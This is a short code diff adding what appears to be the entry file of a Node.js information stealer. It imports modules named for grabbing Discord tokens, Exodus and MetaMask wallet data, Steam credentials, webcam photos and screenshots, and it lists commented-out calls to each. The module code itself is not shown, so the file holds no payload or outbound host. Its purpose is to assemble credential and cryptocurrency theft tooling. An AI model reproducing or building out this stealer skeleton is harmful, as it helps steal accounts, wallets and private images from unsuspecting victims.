@@ -1,0 +1,13 @@
+const { screenshot } = require('./modulos/screenshot')
+const { webcam } = require('./modulos/webcam')
+const { discordtokens } = require('./modulos/discord')
+const { exodus } = require('./modulos/exodus')
+const { metamask } = require('./modulos/metamask')
+const { steam } = require('./modulos/steam')
+
+//discordtokens()
+//exodus()
+//metamask()
+//steam()
+//webcam('webcam.jpg', '')
+//screenshot('screenshot.png', '') 
